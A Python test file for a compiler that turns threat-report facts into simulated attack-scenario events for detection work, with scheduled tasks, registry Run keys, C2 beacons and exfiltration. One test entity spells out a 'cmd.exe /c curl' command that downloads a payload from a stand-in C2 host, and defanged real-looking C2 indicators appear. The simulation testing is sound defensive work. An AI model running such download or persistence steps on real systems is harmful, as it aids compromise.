# Copyright (c) 2026 Cisco Systems, Inc. and its affiliates
# SPDX-License-Identifier: MIT

"""Tests for deterministic report-fact to scenario compilation."""

from hashlib import sha256

import pytest
from pydantic import ValidationError

from evidenceforge.report_ingest.compiler import (
    ReportCompilerError,
    compile_report_ledger,
    resolve_engine_completion_requests,
)
from evidenceforge.report_ingest.models import (
    CompilationStatus,
    CompiledEventType,
    CompiledField,
    CompiledScenarioEvent,
    EntityType,
    ExpectedVisibility,
    FieldOrigin,
    FieldProvenance,
    ReportEntity,
    ReportFact,
    ReportFactLedger,
    ReportMeta,
    ReportRelation,
    SimulationCompletion,
    SimulationPlan,
    SourceCategory,
    SourceSpan,
)


def _source_span() -> SourceSpan:
    text = "用于报告编译器单元测试的来源片段。"
    return SourceSpan(
        span_id="span-0001-000000000000",
        paragraph_number=1,
        char_start=0,
        char_end=len(text),
        text_sha256=sha256(text.encode("utf-8")).hexdigest(),
        quote=text,
    )


def _source_provenance() -> FieldProvenance:
    return FieldProvenance(
        origin=FieldOrigin.SOURCE,
        source_span_ids=["span-0001-000000000000"],
    )


def _fact(fact_id: str, behavior: str, order: int) -> ReportFact:
    return ReportFact(
        fact_id=fact_id,
        behavior=behavior,
        order=order,
        description=f"测试行为 {behavior}",
        provenance=_source_provenance(),
    )


def _entity(
    entity_id: str,
    entity_type: EntityType,
    value: str,
    **attributes: str | int | float | bool | None,
) -> ReportEntity:
    return ReportEntity(
        entity_id=entity_id,
        entity_type=entity_type,
        value=value,
        attributes=attributes,
        provenance=_source_provenance(),
    )


def _relation(
    relation_id: str,
    source_id: str,
    predicate: str,
    target_id: str,
) -> ReportRelation:
    return ReportRelation(
        relation_id=relation_id,
        source_id=source_id,
        predicate=predicate,
        target_id=target_id,
        provenance=_source_provenance(),
    )


def _ledger(
    facts: list[ReportFact],
    entities: list[ReportEntity],
    relations: list[ReportRelation],
) -> ReportFactLedger:
    return ReportFactLedger(
        source_spans=[_source_span()],
        source_metadata=ReportMeta(
            report_name="编译器测试报告",
            description="只验证确定性事实绑定。",
        ),
        metadata_provenance=_source_provenance(),
        facts=facts,
        entities=entities,
        relations=relations,
    )


def _events(compilation: object, fact_id: str, event_type: CompiledEventType) -> list[object]:
    return [
        event
        for event in compilation.events
        if event.fact_id == fact_id and event.event_type == event_type
    ]


def _value(event: object, field_name: str) -> object:
    return event.fields[field_name].value


def test_compiler_never_uses_previous_process_as_implicit_owner() -> None:
    process = _entity("process-cmd", EntityType.PROCESS, r"C:\Windows\System32\cmd.exe")
    url = _entity("url-c2", EntityType.URL, "https://c2.example.test/checkin")
    ledger = _ledger(
        [_fact("fact-exec", "malware_execution", 1), _fact("fact-c2", "c2_checkin", 2)],
        [process, url],
        [
            _relation("relation-exec-owner", "fact-exec", "performed_by", process.entity_id),
            _relation("relation-c2-url", "fact-c2", "connects_to", url.entity_id),
            _relation("relation-c2-target", "fact-c2", "targets", process.entity_id),
        ],
    )

    compilation = compile_report_ledger(ledger)

    assert _events(compilation, "fact-exec", CompiledEventType.PROCESS)[0].status == (
        CompilationStatus.MATERIALIZED
    )
    pending = _events(compilation, "fact-c2", CompiledEventType.CONNECTION)[0]
    assert pending.status == CompilationStatus.NEEDS_COMPLETION
    assert "source_process_ref" not in pending.fields
    assert [
        (request.target_id, request.field_path) for request in compilation.completion_requests
    ] == [("fact-c2", "process.image")]


def test_cmd_download_owner_does_not_leak_into_later_c2() -> None:
    command = _entity(
        "command-download",
        EntityType.COMMAND,
        r"cmd.exe /c curl https://c2.example.test/payload -o C:\Temp\payload.bin",
    )
    url = _entity("url-payload", EntityType.URL, "https://c2.example.test/payload")
    ledger = _ledger(
        [_fact("fact-download", "payload_download", 1), _fact("fact-c2", "c2_checkin", 2)],
        [command, url],
        [
            _relation(
                "relation-download-command",
                "fact-download",
                "uses_command",
                command.entity_id,
            ),
            _relation(
                "relation-download-url",
                "fact-download",
                "downloads_from",
                url.entity_id,
            ),
            _relation("relation-c2-url", "fact-c2", "connects_to", url.entity_id),
        ],
    )

    compilation = compile_report_ledger(ledger)

    download = _events(compilation, "fact-download", CompiledEventType.CONNECTION)[0]
    later_c2 = _events(compilation, "fact-c2", CompiledEventType.CONNECTION)[0]
    assert str(_value(download, "source_process_ref")).startswith("proc-")
    assert _value(download, "method") == "GET"
    assert later_c2.status == CompilationStatus.NEEDS_COMPLETION
    assert "source_process_ref" not in later_c2.fields


def test_download_materializes_its_own_target_file() -> None:
    """A source-bound download destination must become a same-fact file event."""
    process = _entity("process-loader", EntityType.PROCESS, r"C:\ProgramData\loader.exe")
    url = _entity("url-alpha", EntityType.URL, "https://cdn.example.test/alpha.bin")
    target = _entity("file-alpha", EntityType.FILE, r"C:\ProgramData\Lab\alpha.bin")
    ledger = _ledger(
        [_fact("fact-download", "payload_download", 1)],
        [process, url, target],
        [
            _relation("relation-owner", "fact-download", "performed_by", process.entity_id),
            _relation("relation-url", "fact-download", "downloads_from", url.entity_id),
            _relation("relation-file", "fact-download", "creates", target.entity_id),
        ],
    )

    compilation = compile_report_ledger(ledger)
    connection = _events(compilation, "fact-download", CompiledEventType.CONNECTION)
    file_events = _events(compilation, "fact-download", CompiledEventType.FILE_CREATE)

    assert len(connection) == 1
    assert len(file_events) == 1
    assert _value(file_events[0], "path") == r"C:\ProgramData\Lab\alpha.bin"
    assert _value(file_events[0], "process_ref") == _value(connection[0], "source_process_ref")


def test_explicit_file_create_behavior_materializes_with_process_owner() -> None:
    process = _entity("process-writer", EntityType.PROCESS, r"C:\ProgramData\writer.exe")
    target = _entity("file-output", EntityType.FILE, r"C:\Users\Public\resume.tmp")
    ledger = _ledger(
        [_fact("fact-create", "file_create", 1)],
        [process, target],
        [
            _relation("relation-owner", "fact-create", "performed_by", process.entity_id),
            _relation("relation-file", "fact-create", "creates", target.entity_id),
        ],
    )

    compilation = compile_report_ledger(ledger)
    event = _events(compilation, "fact-create", CompiledEventType.FILE_CREATE)[0]

    assert event.status == CompilationStatus.MATERIALIZED
    assert _value(event, "path") == r"C:\Users\Public\resume.tmp"


def test_network_uri_and_method_stay_bound_to_one_behavior() -> None:
    process = _entity("process-agent", EntityType.PROCESS, r"C:\ProgramData\agent.exe")
    url = _entity("url-payload", EntityType.URL, "https://shared.example.test/payload/a.bin")
    domain = _entity(
        "domain-shared",
        EntityType.DOMAIN,
        "shared.example.test",
        protocol="https",
    )
    ip = _entity("ip-shared", EntityType.IP, "203.0.113.44")
    ledger = _ledger(
        [
            _fact("fact-download", "payload_download", 1),
            _fact("fact-beacon", "c2_beacon_https", 2),
        ],
        [process, url, domain, ip],
        [
            _relation(
                "relation-download-owner", "fact-download", "performed_by", process.entity_id
            ),
            _relation("relation-download-url", "fact-download", "downloads_from", url.entity_id),
            _relation("relation-beacon-owner", "fact-beacon", "performed_by", process.entity_id),
            _relation("relation-beacon-domain", "fact-beacon", "connects_to", domain.entity_id),
            _relation("relation-domain-ip", domain.entity_id, "resolves_to", ip.entity_id),
        ],
    )

    compilation = compile_report_ledger(ledger)
    download = _events(compilation, "fact-download", CompiledEventType.CONNECTION)[0]
    beacon = _events(compilation, "fact-beacon", CompiledEventType.CONNECTION)[0]

    assert _value(download, "hostname") == "shared.example.test"
    assert _value(download, "uri") == "/payload/a.bin"
    assert _value(download, "method") == "GET"
    assert _value(beacon, "hostname") == "shared.example.test"
    assert _value(beacon, "dst_ip") == "203.0.113.44"
    assert "uri" not in beacon.fields
    assert "method" not in beacon.fields


def test_two_scheduled_tasks_compile_to_independent_events() -> None:
    process = _entity("process-installer", EntityType.PROCESS, r"C:\Temp\installer.exe")
    first_task = _entity(
        "task-first",
        EntityType.SCHEDULED_TASK,
        "SCS-Update",
        binary=r"C:\ProgramData\scs.exe",
        trigger="每隔 30 分钟",
        creation_method="COM 组件",
    )
    second_task = _entity(
        "task-second",
        EntityType.SCHEDULED_TASK,
        "User_Feed_Synchronization",
        binary=r"C:\Users\Public\feed.exe",
        trigger="用户登录时",
        creation_method="COM 组件",
    )
    ledger = _ledger(
        [_fact("fact-tasks", "persistence_scheduled_task", 1)],
        [process, first_task, second_task],
        [
            _relation("relation-task-owner", "fact-tasks", "performed_by", process.entity_id),
            _relation("relation-task-first", "fact-tasks", "creates", first_task.entity_id),
            _relation("relation-task-second", "fact-tasks", "creates", second_task.entity_id),
        ],
    )

    compilation = compile_report_ledger(ledger)
    tasks = _events(compilation, "fact-tasks", CompiledEventType.SCHEDULED_TASK_CREATED)

    assert len(tasks) == 2
    assert {str(_value(event, "task_name")) for event in tasks} == {
        "SCS-Update",
        "User_Feed_Synchronization",
    }
    assert {
        (str(_value(event, "task_name")), str(_value(event, "task_content"))) for event in tasks
    } == {
        ("SCS-Update", r"C:\ProgramData\scs.exe"),
        ("User_Feed_Synchronization", r"C:\Users\Public\feed.exe"),
    }
    assert {
        (str(_value(event, "task_name")), str(_value(event, "trigger"))) for event in tasks
    } == {
        ("SCS-Update", "每隔 30 分钟"),
        ("User_Feed_Synchronization", "用户登录时"),
    }
    first = next(event for event in tasks if _value(event, "task_name") == "SCS-Update")
    second = next(
        event for event in tasks if _value(event, "task_name") == "User_Feed_Synchronization"
    )
    assert _value(first, "interval_minutes") == 30
    assert _value(first, "creation_method") == "com"
    assert _value(second, "creation_method") == "com"
    assert "interval_minutes" not in second.fields


def test_scheduled_task_without_name_uses_marked_lab_task() -> None:
    ledger = _ledger([_fact("fact-task", "persistence_scheduled_task", 1)], [], [])

    initial = compile_report_ledger(ledger)
    plan, remaining = resolve_engine_completion_requests(
        initial.completion_requests,
        ledger,
    )
    compiled = compile_report_ledger(ledger, plan)
    event = _events(compiled, "fact-task", CompiledEventType.SCHEDULED_TASK_CREATED)[0]
    task = next(
        entity
        for entity in compiled.generated_entities
        if entity.entity_type == EntityType.SCHEDULED_TASK
    )

    assert remaining == []
    assert event.status == CompilationStatus.MATERIALIZED
    assert _value(event, "task_name") == task.value
    assert str(task.value).startswith("EvidenceForge_ReportTask_")
    assert event.fields["task_name"].provenance.origin == FieldOrigin.ENGINE_GENERATED
    assert event.source_category == SourceCategory.PARTIALLY_ENGINE_GENERATED


def test_registry_read_and_write_compile_to_different_event_types() -> None:
    process = _entity("process-agent", EntityType.PROCESS, r"C:\ProgramData\agent.exe")
    query_key = _entity(
        "registry-bios",
        EntityType.REGISTRY,
        r"HKLM\HARDWARE\DESCRIPTION\System\BIOS",
        value_name="BIOSVendor",
    )
    set_key = _entity(
        "registry-run",
        EntityType.REGISTRY,
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
        value_name="Updater",
        value_data=r"C:\ProgramData\agent.exe",
    )
    ledger = _ledger(
        [_fact("fact-query", "registry_query", 1), _fact("fact-set", "registry_set", 2)],
        [process, query_key, set_key],
        [
            _relation("relation-query-owner", "fact-query", "performed_by", process.entity_id),
            _relation("relation-query-key", "fact-query", "queries", query_key.entity_id),
            _relation("relation-set-owner", "fact-set", "performed_by", process.entity_id),
            _relation("relation-set-key", "fact-set", "sets", set_key.entity_id),
        ],
    )

    compilation = compile_report_ledger(ledger)

    assert len(_events(compilation, "fact-query", CompiledEventType.REGISTRY_QUERY)) == 1
    assert len(_events(compilation, "fact-query", CompiledEventType.REGISTRY_SET)) == 0
    assert len(_events(compilation, "fact-set", CompiledEventType.REGISTRY_SET)) == 1


def test_unobservable_behavior_degrades_without_inventing_command() -> None:
    ledger = _ledger([_fact("fact-evasion", "anti_debug_anti_vm", 1)], [], [])

    compilation = compile_report_ledger(ledger)
    event = compilation.events[0]

    assert event.fact_id == "fact-evasion"
    assert event.status == CompilationStatus.GROUND_TRUTH_ONLY
    assert event.event_type is None
    assert event.degradation_reason
    assert event.expected_visibility == [ExpectedVisibility.GROUND_TRUTH]
    assert "command_line" not in event.fields
    assert compilation.completion_requests == []


def test_process_behavior_without_owner_uses_marked_engine_process() -> None:
    ledger = _ledger([_fact("fact-recon", "host_recon", 1)], [], [])

    initial = compile_report_ledger(ledger)
    plan, remaining = resolve_engine_completion_requests(
        initial.completion_requests,
        ledger,
    )
    compiled = compile_report_ledger(ledger, plan)
    event = _events(compiled, "fact-recon", CompiledEventType.PROCESS)[0]

    assert remaining == []
    assert event.status == CompilationStatus.MATERIALIZED
    assert event.source_category == SourceCategory.PARTIALLY_ENGINE_GENERATED
    assert event.fields["process_name"].provenance.origin == FieldOrigin.ENGINE_GENERATED
    assert "command_line" not in event.fields
    assert "cmd.exe" not in str(_value(event, "process_name")).casefold()
    assert "powershell" not in str(_value(event, "process_name")).casefold()


def test_anti_analysis_targets_materialize_with_marked_engine_owner() -> None:
    target = _entity("process-vmtools", EntityType.PROCESS, "vmtoolsd.exe")
    registry = _entity(
        "registry-bios",
        EntityType.REGISTRY,
        r"HKLM\HARDWARE\DESCRIPTION\System\BIOS",
    )
    ledger = _ledger(
        [_fact("fact-evasion", "anti_debug_anti_vm", 1)],
        [target, registry],
        [
            _relation("relation-target", "fact-evasion", "checks", target.entity_id),
            _relation("relation-registry", "fact-evasion", "queries", registry.entity_id),
        ],
    )

    initial = compile_report_ledger(ledger)
    plan, remaining = resolve_engine_completion_requests(
        initial.completion_requests,
        ledger,
    )
    compiled = compile_report_ledger(ledger, plan)
    process_events = _events(compiled, "fact-evasion", CompiledEventType.PROCESS)
    access = _events(compiled, "fact-evasion", CompiledEventType.PROCESS_ACCESS)[0]
    query = _events(compiled, "fact-evasion", CompiledEventType.REGISTRY_QUERY)[0]
    target_prerequisite = next(
        event for event in process_events if event.subject_entity_id == target.entity_id
    )
    owner_prerequisite = next(
        event for event in process_events if event.subject_entity_id != target.entity_id
    )

    assert remaining == []
    assert compiled.events.index(target_prerequisite) < compiled.events.index(owner_prerequisite)
    assert compiled.events.index(owner_prerequisite) < compiled.events.index(access)
    assert target_prerequisite.status == CompilationStatus.MATERIALIZED
    assert target_prerequisite.source_category == SourceCategory.FULLY_SYNTHETIC
    assert target_prerequisite.necessity_reason
    assert _value(target_prerequisite, "process_name") == "vmtoolsd.exe"
    assert (
        target_prerequisite.fields["process_name"].provenance.origin == FieldOrigin.SOURCE
    )
    assert target_prerequisite.fields["persistent"].provenance.origin == (
        FieldOrigin.ENGINE_GENERATED
    )
    assert access.status == CompilationStatus.MATERIALIZED
    assert _value(access, "target_process") == "vmtoolsd.exe"
    assert access.fields["target_process"].provenance.origin == FieldOrigin.SOURCE
    assert access.fields["access_mask"].provenance.origin == FieldOrigin.ENGINE_GENERATED
    assert query.status == CompilationStatus.MATERIALIZED
    assert _value(query, "key") == r"HKLM\HARDWARE\DESCRIPTION\System\BIOS"
    assert access.source_category == SourceCategory.PARTIALLY_ENGINE_GENERATED
    assert query.source_category == SourceCategory.PARTIALLY_ENGINE_GENERATED


def test_unbound_network_fact_uses_reserved_marked_simulation_endpoint() -> None:
    ledger = _ledger([_fact("fact-exfil", "c2_system_info_exfil", 1)], [], [])

    initial = compile_report_ledger(ledger)
    plan, remaining = resolve_engine_completion_requests(
        initial.completion_requests,
        ledger,
    )
    compiled = compile_report_ledger(ledger, plan)
    event = _events(compiled, "fact-exfil", CompiledEventType.CONNECTION)[0]

    assert remaining == []
    assert event.status == CompilationStatus.MATERIALIZED
    assert str(_value(event, "dst_ip")).startswith("203.0.113.")
    assert event.fields["dst_ip"].provenance.origin == FieldOrigin.ENGINE_GENERATED
    assert event.fields["method"].provenance.origin == FieldOrigin.ENGINE_GENERATED
    assert event.channel_entity_ids == []
    assert compiled.generated_entities[0].entity_type == EntityType.PROCESS


def test_system_info_exfil_does_not_treat_bound_file_as_source_file() -> None:
    file = _entity(
        "file-task-binary",
        EntityType.FILE,
        r"%UserProfile%\AppData\Local\Microsoft\Feeds\msfeedsync.exe",
    )
    ledger = _ledger(
        [_fact("fact-exfil", "c2_system_info_exfil", 1)],
        [file],
        [_relation("relation-wrong-file", "fact-exfil", "uses", file.entity_id)],
    )

    initial = compile_report_ledger(ledger)
    plan, remaining = resolve_engine_completion_requests(
        initial.completion_requests,
        ledger,
    )
    compiled = compile_report_ledger(ledger, plan)
    event = _events(compiled, "fact-exfil", CompiledEventType.CONNECTION)[0]

    assert remaining == []
    assert "source_file" not in event.fields
    assert event.object_entity_ids == []


def test_defanged_network_iocs_use_derived_materialization_values() -> None:
    process = _entity("process-agent", EntityType.PROCESS, r"C:\ProgramData\agent.exe")
    domain = _entity("domain-c2", EntityType.DOMAIN, "panbaiclu[.]com")
    ip = _entity("ip-c2", EntityType.IP, "158.255.215[.]248")
    ledger = _ledger(
        [
            _fact("fact-c2", "c2_beacon_https", 1),
            _fact("fact-dns", "c2_dns_resolution", 2),
        ],
        [process, domain, ip],
        [
            _relation("relation-c2-owner", "fact-c2", "performed_by", process.entity_id),
            _relation("relation-c2-domain", "fact-c2", "connects_to", domain.entity_id),
            _relation("relation-dns-domain", "fact-dns", "queries", domain.entity_id),
            _relation("relation-domain-ip", domain.entity_id, "resolves_to", ip.entity_id),
        ],
    )

    compilation = compile_report_ledger(ledger)
    connection = _events(compilation, "fact-c2", CompiledEventType.CONNECTION)[0]
    dns = _events(compilation, "fact-dns", CompiledEventType.DNS_QUERY)[0]

    assert domain.value == "panbaiclu[.]com"
    assert ip.value == "158.255.215[.]248"
    assert _value(connection, "hostname") == "panbaiclu.com"
    assert _value(connection, "dst_ip") == "158.255.215.248"
    assert _value(dns, "query") == "panbaiclu.com"
    assert _value(dns, "answer") == "158.255.215.248"
    for event, field_names in (
        (connection, ("hostname", "dst_ip")),
        (dns, ("query", "answer")),
    ):
        for field_name in field_names:
            assert event.fields[field_name].provenance.origin == FieldOrigin.DERIVED
            assert event.fields[field_name].provenance.source_ids


def test_self_deletion_without_file_deletes_marked_simulation_image() -> None:
    ledger = _ledger([_fact("fact-cleanup", "self_deletion", 1)], [], [])

    initial = compile_report_ledger(ledger)
    plan, remaining = resolve_engine_completion_requests(
        initial.completion_requests,
        ledger,
    )
    compiled = compile_report_ledger(ledger, plan)
    event = _events(compiled, "fact-cleanup", CompiledEventType.FILE_DELETE)[0]
    process = compiled.generated_entities[0]

    assert remaining == []
    assert event.status == CompilationStatus.MATERIALIZED
    assert _value(event, "path") == process.value
    assert event.fields["path"].provenance.origin == FieldOrigin.ENGINE_GENERATED
    assert event.object_entity_ids == [process.entity_id]
    assert event.source_category == SourceCategory.PARTIALLY_ENGINE_GENERATED


def test_phishing_without_recipient_uses_internal_marked_mailbox() -> None:
    ledger = _ledger([_fact("fact-mail", "spearphishing_attachment", 1)], [], [])

    compiled = compile_report_ledger(ledger)
    event = _events(compiled, "fact-mail", CompiledEventType.EMAIL_MESSAGE)[0]

    assert event.status == CompilationStatus.MATERIALIZED
    assert _value(event, "to") == ["report.user@report-lab.local"]
    assert event.fields["to"].provenance.origin == FieldOrigin.ENGINE_GENERATED
    assert event.source_category == SourceCategory.PARTIALLY_ENGINE_GENERATED
    assert compiled.generated_entities == []


def test_compiled_event_keeps_fact_field_provenance_and_visibility() -> None:
    process = _entity("process-agent", EntityType.PROCESS, r"C:\ProgramData\agent.exe")
    url = _entity("url-download", EntityType.URL, "https://download.example.test/a.bin")
    ledger = _ledger(
        [_fact("fact-download", "payload_download", 1)],
        [process, url],
        [
            _relation("relation-owner", "fact-download", "performed_by", process.entity_id),
            _relation("relation-url", "fact-download", "downloads_from", url.entity_id),
        ],
    )

    compilation = compile_report_ledger(ledger)
    event = _events(compilation, "fact-download", CompiledEventType.CONNECTION)[0]

    assert event.fact_id == "fact-download"
    assert event.subject_entity_id == process.entity_id
    assert event.channel_entity_ids == [url.entity_id]
    assert ExpectedVisibility.NETWORK_FLOW in event.expected_visibility
    assert event.fields["hostname"].provenance.origin == FieldOrigin.DERIVED
    assert event.fields["hostname"].provenance.source_ids == [url.entity_id]
    assert event.fields["uri"].provenance.origin == FieldOrigin.DERIVED


def test_fully_synthetic_bridge_requires_reason_and_forbids_external_ioc() -> None:
    provenance = FieldProvenance(
        origin=FieldOrigin.AI_COMPLETED,
        source_ids=["fact-source"],
        reason="为可执行性补全内部进程。",
    )

    with pytest.raises(ValidationError, match="必要性原因"):
        CompiledScenarioEvent(
            event_id="event-synthetic",
            fact_id="fact-source",
            order=1,
            event_type=CompiledEventType.PROCESS,
            activity="建立仿真进程",
            fields={"process_name": CompiledField(value="agent.exe", provenance=provenance)},
            source_category=SourceCategory.FULLY_SYNTHETIC,
            status=CompilationStatus.MATERIALIZED,
            expected_visibility=[ExpectedVisibility.ENDPOINT_PROCESS],
        )

    with pytest.raises(ValidationError, match="外部 IOC"):
        CompiledScenarioEvent(
            event_id="event-synthetic",
            fact_id="fact-source",
            order=1,
            event_type=CompiledEventType.CONNECTION,
            activity="不允许的合成外联",
            fields={
                "hostname": CompiledField(
                    value="invented.example.test",
                    provenance=provenance,
                )
            },
            source_category=SourceCategory.FULLY_SYNTHETIC,
            status=CompilationStatus.MATERIALIZED,
            expected_visibility=[ExpectedVisibility.NETWORK_FLOW],
            necessity_reason="测试合成桥接约束。",
        )


def test_process_completion_materializes_only_the_requested_behavior() -> None:
    url = _entity("url-c2", EntityType.URL, "https://c2.example.test/checkin")
    ledger = _ledger(
        [_fact("fact-c2", "c2_checkin", 1)],
        [url],
        [_relation("relation-c2-url", "fact-c2", "connects_to", url.entity_id)],
    )
    initial = compile_report_ledger(ledger)
    request = initial.completion_requests[0]
    completion = SimulationCompletion(
        request_id=request.request_id,
        target_id=request.target_id,
        field_path=request.field_path,
        value=r"C:\ProgramData\ReportSim\agent.exe",
        origin=FieldOrigin.AI_COMPLETED,
        reason="为已有 C2 行为补全一个内部恶意进程。",
        compatible=True,
        compatibility_explanation="没有改变报告 URL 或新增攻击行为。",
    )

    compiled = compile_report_ledger(ledger, SimulationPlan(completions=[completion]))
    connection = _events(compiled, "fact-c2", CompiledEventType.CONNECTION)[0]
    bridge = [
        event
        for event in compiled.events
        if event.event_type == CompiledEventType.PROCESS
        and event.source_category == SourceCategory.FULLY_SYNTHETIC
    ][0]

    assert compiled.completion_requests == [request]
    assert connection.status == CompilationStatus.MATERIALIZED
    assert connection.source_category == SourceCategory.PARTIALLY_AI_COMPLETED
    assert str(_value(connection, "source_process_ref")).startswith("proc-")
    assert connection.fields["source_process_ref"].provenance.origin == FieldOrigin.AI_COMPLETED
    assert bridge.necessity_reason
    assert compiled.generated_entities[0].provenance.origin == FieldOrigin.AI_COMPLETED
    assert compiled.generated_entities[0].value == r"C:\ProgramData\ReportSim\agent.exe"


def test_process_completion_rejects_unreported_command_interpreter() -> None:
    url = _entity("url-c2", EntityType.URL, "https://c2.example.test/checkin")
    ledger = _ledger(
        [_fact("fact-c2", "c2_checkin", 1)],
        [url],
        [_relation("relation-c2-url", "fact-c2", "connects_to", url.entity_id)],
    )
    request = compile_report_ledger(ledger).completion_requests[0]
    completion = SimulationCompletion(
        request_id=request.request_id,
        target_id=request.target_id,
        field_path=request.field_path,
        value=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        origin=FieldOrigin.AI_COMPLETED,
        reason="错误地猜测攻击使用 PowerShell。",
        compatible=True,
        compatibility_explanation="模型声称兼容，但本地规则必须拒绝。",
    )

    with pytest.raises(ReportCompilerError, match="命令解释器"):
        compile_report_ledger(ledger, SimulationPlan(completions=[completion]))


def test_process_completion_is_resolved_by_stable_engine_placeholder() -> None:
    url = _entity("url-c2", EntityType.URL, "https://c2.example.test/checkin")
    ledger = _ledger(
        [_fact("fact-c2", "c2_checkin", 1)],
        [url],
        [_relation("relation-c2-url", "fact-c2", "connects_to", url.entity_id)],
    )
    initial = compile_report_ledger(ledger)

    plan, remaining = resolve_engine_completion_requests(initial.completion_requests, ledger)
    compiled = compile_report_ledger(ledger, plan)
    connection = _events(compiled, "fact-c2", CompiledEventType.CONNECTION)[0]

    assert remaining == []
    assert len(plan.completions) == 1
    assert plan.completions[0].origin == FieldOrigin.ENGINE_GENERATED
    assert "cmd.exe" not in str(plan.completions[0].value).casefold()
    assert "powershell" not in str(plan.completions[0].value).casefold()
    assert connection.status == CompilationStatus.MATERIALIZED
    assert connection.source_category == SourceCategory.PARTIALLY_ENGINE_GENERATED
    assert compiled.generated_entities[0].provenance.origin == FieldOrigin.ENGINE_GENERATED
